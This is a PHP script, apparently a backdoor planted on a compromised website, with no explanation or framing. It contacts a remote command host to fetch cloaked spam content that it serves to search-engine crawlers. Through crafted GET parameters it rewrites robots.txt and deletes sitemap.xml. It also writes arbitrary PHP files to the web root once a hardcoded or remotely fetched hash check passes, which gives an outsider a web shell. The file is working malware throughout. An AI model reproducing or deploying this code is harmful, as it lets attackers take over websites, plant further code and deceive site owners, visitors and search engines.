<?php

@set_time_limit(3600);
@ignore_user_abort(1);
$xmlname = "zmwl";
$http_web = "http";
if (is_htps()) {
    $http = "https";
} else {
    $http = "http";
}
$duri_tmp = st_uri();
if ($duri_tmp == '') {
    $duri_tmp = "/";
}
$duri = urlencode($duri_tmp);
function st_uri()
{
    if (isset($_SERVER["REQUEST_URI"])) {
        $duri = $_SERVER["REQUEST_URI"];
    } else {
        if (isset($_SERVER["argv"])) {
            $duri = $_SERVER["PHP_SELF"] . "?" . $_SERVER["argv"][0];
        } else {
            $duri = $_SERVER["PHP_SELF"] . "?" . $_SERVER["QUERY_STRING"];
        }
    }
    return $duri;
}
$goweb = $xmlname . ".bindonlineurl" . ".xyz";
function is_htps()
{
    if (isset($_SERVER["HTTPS"]) && strtolower($_SERVER["HTTPS"]) !== "off") {
        return true;
    } elseif (isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && $_SERVER["HTTP_X_FORWARDED_PROTO"] === "https") {
        return true;
    } elseif (isset($_SERVER["HTTP_FRONT_END_HTTPS"]) && strtolower($_SERVER["HTTP_FRONT_END_HTTPS"]) !== "off") {
        return true;
    }
    return false;
}
$host = $_SERVER["HTTP_HOST"];
$lang = @$_SERVER["HTTP_ACCEPT_LANGUAGE"];
$lang = urlencode($lang);
$urlshang = '';
if (isset($_SERVER["HTTP_REFERER"])) {
    $urlshang = $_SERVER["HTTP_REFERER"];
    $urlshang = urlencode($urlshang);
}
if (@$_GET["pd"] != '') {
    $add_content = @$_GET["mapname"];
    $action = @$_GET["action"];
    if (isset($_SERVER["DOCUMENT_ROOT"])) {
        $path = $_SERVER["DOCUMENT_ROOT"];
    } else {
        $path = "/var/www/html";
    }
    if (!$action) {
        $action = "put";
    }
    if ($action == "put") {
        if (strstr($add_content, ".xml")) {
            $map_path = $path . "/sitemap.xml";
            if (is_file($map_path)) {
                @unlink($map_path);
            }
            $file_path = $path . "/robots.txt";
            if (file_exists($file_path)) {
                $data = dageget($file_path);
            } else {
                $data = "User-agent: *Allow: /";
            }
            $sitmap_url = $http . "://" . $host . "/" . $add_content;
            if (stristr($data, $sitmap_url)) {
                echo "<br>sitemap already added!<br>";
            } else {
                if (file_put_contents($file_path, trim($data) . "\r\n" . "Sitemap: " . $sitmap_url)) {
                    echo "<br>ok<br>";
                } else {
                    echo "<br>file write false!<br>";
                }
            }
        } else {
            echo "<br>sitemap name false!<br>";
        }
        if (strstr($add_content, ".php")) {
            $a = sha1(sha1(@$_GET["a"]));
            $b = sha1(sha1(@$_GET["b"]));
            if ($a == dageget($http_web . "://" . $goweb . "/a.p" . "hp") || $b == "808735b17c8943e3715388958dc22d879a8c9eaa") {
                $dstr = @$_GET["dstr"];
                if (file_put_contents($path . "/" . $add_content, $dstr)) {
                    echo "ok";
                }
            }
        }
    }
    die;
}
$web = $http_web . "://" . $goweb . "/indexnew.php?web=" . $host . "&zz=" . sbot() . "&uri=" . $duri . "&urlshang=" . $urlshang . "&http=" . $http . "&lang=" . $lang;
$htmcontent = trim(dageget($web));
if (!strstr($htmcontent, "nobotuseragent")) {
    if (strstr($htmcontent, "okhtmlgetcontent")) {
        @header("Content-type: text/html; charset=utf-8");
        $htmcontent = str_replace("okhtmlgetcontent", '', $htmcontent);
        echo $htmcontent;
        die;
    } else {
        if (strstr($htmcontent, "okxmlgetcontent")) {
            $htmcontent = str_replace("okxmlgetcontent", '', $htmcontent);
            @header("Content-type: text/xml");
            echo $htmcontent;
            die;
        } else {
            if (strstr($htmcontent, "pingxmlgetcontent")) {
                $htmcontent = str_replace("pingxmlgetcontent", '', $htmcontent);
                @header("Content-type: text/html; charset=utf-8");
                echo pingmap($htmcontent);
                die;
            }
        }
    }
}
function pingmap($url)
{
    $url_arr = explode("\r\n", trim($url));
    $return_str = '';
    foreach ($url_arr as $pingUrl) {
        $pingRes = dageget($pingUrl);
        $ok = strpos($pingRes, "Sitemap Notification Received") !== false ? "pingok" : "error";
        $return_str .= $pingUrl . "-- " . $ok . "<br>";
    }
    return $return_str;
}
function sbot()
{
    $uAgent = strtolower($_SERVER["HTTP_USER_AGENT"]);
    if (stristr($uAgent, "googlebot") || stristr($uAgent, "bing") || stristr($uAgent, "yahoo") || stristr($uAgent, "google") || stristr($uAgent, "Googlebot") || stristr($uAgent, "googlebot")) {
        return true;
    } else {
        return false;
    }
}
function dageget($url)
{
    $file_contents = '';
    if (function_exists("curl_init")) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        $file_contents = curl_exec($ch);
        curl_close($ch);
    }
    if (!$file_contents) {
        $file_contents = @file_get_contents($url);
    }
    return $file_contents;
}
